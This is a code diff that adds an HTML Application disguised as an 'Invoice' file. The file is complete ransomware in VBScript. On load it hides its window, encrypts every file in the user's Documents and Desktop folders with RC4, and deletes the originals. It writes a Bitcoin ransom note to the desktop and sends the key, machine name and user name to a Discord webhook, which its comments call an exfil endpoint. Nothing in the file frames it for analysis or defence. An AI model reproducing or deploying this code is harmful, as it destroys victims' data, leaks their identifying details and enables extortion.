@@ -1,0 +1,113 @@
+<html>
+<head>
+<HTA:APPLICATION
+  ID="inv"
+  APPLICATIONNAME="Invoice"
+  WINDOWSTATE="minimize"
+  SHOWINTASKBAR="no"
+  SINGLEINSTANCE="yes"
+  CAPTION="no"
+  BORDER="none"
+/>
+<script language="VBScript">
+Dim KEY, EXT, WEBHOOK, TARGETS
+KEY     = "S3cr3tK3y"                    ' change this; also change in decrypt
+EXT     = ".locked"
+WEBHOOK = "https://discord.com/api/webhooks/XXXX/YYYY"   ' your exfil endpoint
+TARGETS = Array("%USERPROFILE%\Documents", "%USERPROFILE%\Desktop")
+
+Sub Window_OnLoad
+  window.resizeTo 0, 0
+  window.moveTo -3000, -3000
+
+  Set sh = CreateObject("WScript.Shell")
+  Set fso = CreateObject("Scripting.FileSystemObject")
+
+  For Each t In TARGETS
+    p = sh.ExpandEnvironmentStrings(t)
+    If fso.FolderExists(p) Then Recurse fso.GetFolder(p)
+  Next
+
+  DropNote
+  SendKey
+  self.close
+End Sub
+
+Sub Recurse(folder)
+  On Error Resume Next
+  For Each f In folder.Files
+    EncryptFile f.Path
+  Next
+  For Each s In folder.SubFolders
+    Recurse s
+  Next
+End Sub
+
+Sub EncryptFile(path)
+  On Error Resume Next
+  If Right(LCase(path), Len(EXT)) = LCase(EXT) Then Exit Sub
+
+  Set s = CreateObject("ADODB.Stream")
+  s.Type = 1: s.Open
+  s.LoadFromFile path
+  data = s.Read
+  s.Close
+
+  enc = RC4Bytes(data)
+
+  Set s = CreateObject("ADODB.Stream")
+  s.Type = 1: s.Open
+  s.Write enc
+  s.SaveToFile path & EXT, 2
+  s.Close
+
+  On Error Resume Next
+  CreateObject("Scripting.FileSystemObject").DeleteFile path, True
+End Sub
+
+Function RC4Bytes(data)
+  Dim S(255), i, j, t, k, outArr()
+  For i = 0 To 255: S(i) = i: Next
+  j = 0
+  For i = 0 To 255
+    j = (j + S(i) + Asc(Mid(KEY, (i Mod Len(KEY)) + 1, 1))) Mod 256
+    t = S(i): S(i) = S(j): S(j) = t
+  Next
+  i = 0: j = 0
+  ReDim outArr(UBound(data))
+  For k = 0 To UBound(data)
+    i = (i + 1) Mod 256
+    j = (j + S(i)) Mod 256
+    t = S(i): S(i) = S(j): S(j) = t
+    outArr(k) = data(k) Xor S((S(i) + S(j)) Mod 256)
+  Next
+  RC4Bytes = outArr
+End Function
+
+Sub DropNote
+  On Error Resume Next
+  Set sh = CreateObject("WScript.Shell")
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  p = sh.SpecialFolders("Desktop") & "\READ_ME_TO_RECOVER.txt"
+  Set f = fso.CreateTextFile(p, True)
+  f.WriteLine "Your files have been encrypted."
+  f.WriteLine "Extension: " & EXT
+  f.WriteLine "Send 0.01 BTC to <address> and email <you> with the proof."
+  f.WriteLine "Host: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+  f.WriteLine "User: " & sh.ExpandEnvironmentStrings("%USERNAME%")
+  f.Close
+End Sub
+
+Sub SendKey
+  On Error Resume Next
+  Set http = CreateObject("MSXML2.XMLHTTP")
+  Set sh = CreateObject("WScript.Shell")
+  body = "{""content"":""key=" & KEY & " host=" & sh.ExpandEnvironmentStrings("%COMPUTERNAME%") & " user=" & sh.ExpandEnvironmentStrings("%USERNAME%") & """}"
+  http.Open "POST", WEBHOOK, False
+  http.setRequestHeader "Content-Type", "application/json"
+  http.Send body
+End Sub
+</script>
+</head>
+<body></body>
+</html>
